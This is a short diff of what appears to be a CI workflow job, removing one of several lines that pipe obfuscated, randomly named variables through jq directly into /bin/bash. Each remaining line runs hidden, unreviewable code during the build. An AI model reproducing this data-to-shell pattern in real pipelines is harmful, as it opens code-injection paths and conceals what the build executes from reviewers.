@@ -23,7 +23,6 @@ jobs:
           printf '%s' "$zauzs6627" | jq -r .udrww46325 | /bin/bash
           printf '%s' "$lokb178" | jq -r .d357 | /bin/bash
           echo $lw56438 | jq -r .j3067 | /bin/bash
-          echo $a6 | jq -r .limzn0050 | /bin/bash
           echo $dcl11 | jq -r .g0 | /bin/bash
 
       - name: Archive results
